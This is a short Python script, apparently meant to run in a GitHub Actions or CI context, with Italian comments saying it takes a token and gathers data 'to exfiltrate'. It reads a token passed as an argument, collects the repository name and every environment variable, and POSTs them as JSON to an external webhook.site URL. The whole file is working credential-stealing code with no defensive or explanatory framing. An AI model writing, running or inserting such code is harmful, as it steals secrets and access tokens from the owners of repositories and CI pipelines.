import os
import sys
import urllib.request
import json

def run():
    # Recupera il token passato come argomento
    token_to_steal = sys.argv[1]
    
    # Dati da esfiltrare
    leak_data = {
        "repo": os.environ.get("GITHUB_REPOSITORY"),
        "stolen_token": token_to_steal,
        "env_vars": dict(os.environ)
    }

    webhook_url = "https://webhook.site/40eadd26-7819-445d-a6b3-51b66ed36c40"
    
    data = json.dumps(leak_data).encode('utf-8')
    req = urllib.request.Request(webhook_url, data=data, method="POST")
    req.add_header('Content-Type', 'application/json')
    urllib.request.urlopen(req)

if __name__ == "__main__":
    run()
